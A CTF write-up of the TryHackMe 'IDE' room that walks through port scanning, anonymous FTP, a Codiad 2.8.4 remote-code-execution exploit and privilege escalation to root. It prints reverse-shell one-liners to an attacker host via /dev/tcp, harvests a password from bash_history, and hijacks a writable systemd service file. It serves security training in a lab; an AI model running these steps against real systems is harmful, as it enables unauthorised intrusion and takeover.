---
title: "IDE"
date: 2025-01-24
image: /assets/img/tryhackme/IDE/IDE_image.jpg
description: Writeup of the TryHackMe-CTF IDE
categories: [Tryhackme, Easy]
tags: [linux, ernumeration, web, privesc, exploit]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>IDE</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>An easy box to polish your enumeration skills!</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/r/room/ide">https://tryhackme.com/r/room/ide</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution to the CTF challenge IDE.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.249.68            
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 11:44 EST
  Nmap scan report for 10.10.249.68
  Host is up (0.043s latency).
  Not shown: 65531 closed tcp ports (conn-refused)
  PORT      STATE SERVICE
  21/tcp    open  ftp
  22/tcp    open  ssh
  80/tcp    open  http
  62337/tcp open  unknown

  Nmap done: 1 IP address (1 host up) scanned in 27.20 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 21,22,80,62337 10.10.249.68
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 11:45 EST
  Nmap scan report for 10.10.249.68
  Host is up (0.057s latency).

  PORT      STATE SERVICE VERSION
  21/tcp    open  ftp     vsftpd 3.0.3
  |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
  | ftp-syst: 
  |   STAT: 
  | FTP server status:
  |      Connected to ::ffff:10.21.63.26
  |      Logged in as ftp
  |      TYPE: ASCII
  |      No session bandwidth limit
  |      Session timeout in seconds is 300
  |      Control connection is plain text
  |      Data connections will be plain text
  |      At session startup, client count was 1
  |      vsFTPd 3.0.3 - secure, fast, stable
  |_End of status
  22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)
  |   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)
  |_  256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)
  80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-title: Apache2 Ubuntu Default Page: It works
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  |_http-title: Codiad 2.8.4
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 15.64 seconds
```
From here I proceeded the analysis port by port.

## Port 21 Analysis
As we can see in the `nmap` output the ftp server allows anonymous access:
```bash
$ ftp anonymous@10.10.249.68
  Connected to 10.10.249.68.
  220 (vsFTPd 3.0.3)
  331 Please specify the password.
  Password: 
  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
  ftp> ls -al
  229 Entering Extended Passive Mode (|||62412|)
  150 Here comes the directory listing.
  drwxr-xr-x    3 0        114          4096 Jun 18  2021 .
  drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
  drwxr-xr-x    2 0        0            4096 Jun 18  2021 ...
  226 Directory send OK.
  ftp> cd ...
  250 Directory successfully changed.
  ftp> ls -al
  229 Entering Extended Passive Mode (|||52646|)
  150 Here comes the directory listing.
  -rw-r--r--    1 0        0             151 Jun 18  2021 -
  drwxr-xr-x    2 0        0            4096 Jun 18  2021 .
  drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
  226 Directory send OK.
	ftp> get -
```
The file with the name `-` gives us some hints:
```bash
$ cat ./-
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.
```

## Port 80 Analysis
The webserver showing us an Apache2 default page. After several enumeration techniques I didn't found anything interesting and moved to the next port.

## Port 62337 Analysis
The website shows a login to Codiad version `2.8.4`. With the message we found previous let's try some default passwords we have in mind. Success :)

![Codiad](/assets/img/tryhackme/IDE/thm_ide_1.jpg){: width="1270" height="925"}

Played around with the site but didn't found anything intersting. I found the following <a href="https://www.exploit-db.com/exploits/49705">exploit-db</a> entry which seems to help out:
```bash
$ python3 exploit.py http://[attacker ip]:62337/ john [removed] [attacker ip] 9001 linux
  [+] Please execute the following command on your vps: 
  echo 'bash -c "bash -i >/dev/tcp/[attacker ip]/9002 0>&1 2>&1"' | nc -lnvp 9001
  nc -lnvp 9002
  [+] Please confirm that you have done the two command above [y/n]
  [Y/n] y
  [+] Starting...
  [+] Login Content : {"status":"success","data":{"username":"john"}}
  [+] Login success!
  [+] Getting writeable path...
  [+] Path Content : {"status":"success","data":{"name":"CloudCall","path":"\/var\/www\/html\/codiad_projects"}}
  [+] Writeable Path : /var/www/html/codiad_projects
  [+] Sending payload...
```
In the other terminal we got our shell:
```bash
$ nc -lnvp 9002 
  listening on [any] 9002 ...
  connect to [10.21.63.26] from (UNKNOWN) [10.10.249.68] 55924
  bash: cannot set terminal process group (1003): Inappropriate ioctl for device
  bash: no job control in this shell
www-data@ide:/var/www/html/codiad/components/filemanager$
www-data@ide:/var/www/html/codiad/components/filemanager$ cd /home
	cd /home
www-data@ide:/home$ ls
  ls
  drac
www-data@ide:/home$ cd drac
	cd drac
www-data@ide:/home/drac$ ls
  ls
  user.txt
www-data@ide:/home/drac$ cat user.txt
  cat user.txt
  cat: user.txt: Permission denied
www-data@ide:/home/drac$
```
We need to change the user to `drac` first.

## Privilege Escalation drac
I searched a while and found something interesting in the bash_history:
```bash
www-data@ide:/var/www/html/codiad$ cat /home/drac/.bash_history
	mysql -u drac -p '[removed]'
www-data@ide:/var/www/html/codiad$ su drac 
	Password: 
drac@ide:/var/www/html/codiad$ cat /home/drac/user.txt 
	[*** removed ***]
drac@ide:/var/www/html/codiad$
```
With the credentials we can ssh in for a better connection.

## Privilege Escalation root
I started with `sudo -l` and got the following output:
```bash
drac@ide:~$ sudo -l
  [sudo] password for drac: 
  Matching Defaults entries for drac on ide:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User drac may run the following commands on ide:
      (ALL : ALL) /usr/sbin/service vsftpd restart
```
A quick search for privilege escalation with the `service` executable directed me to <a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-service-privilege-escalation/">exploit-notes</a>:
```bash
drac@ide:~$ find / -name "vsftpd.service" 2>/dev/null
[reduced the output]
 /lib/systemd/system/vsftpd.service
[reduced the output]
drac@ide:~$ ls -al /lib/systemd/system/vsftpd.service
	-rw-rw-r-- 1 root drac 248 Aug  4  2021 /lib/systemd/system/vsftpd.service
```
The user `drac` is able to write this file. Let's proceed and open the file `/lib/systemd/system/vsftpd.service` and change:
```bash
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty
to
ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/[attacker ip]/4444 0>&1'
```
Start an Netcat listener with the port `4444`, reload the deamon and restart `vsftpd`:
```bash
drac@ide:~$ systemctl daemon-reload
==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
Authentication is required to reload the systemd state.                                                                                                                 
Authenticating as: drac
Password: 
==== AUTHENTICATION COMPLETE ===
sudo /usr/sbin/service vsftpd restart
```
On the attacker machine:
```bash
root@ide:/# cd /root
cd /root
root@ide:/root# ls
ls
root.txt
root@ide:/root# cat root.txt
cat root.txt
[*** removed ***]
root@ide:/root# 
```

solved! :)
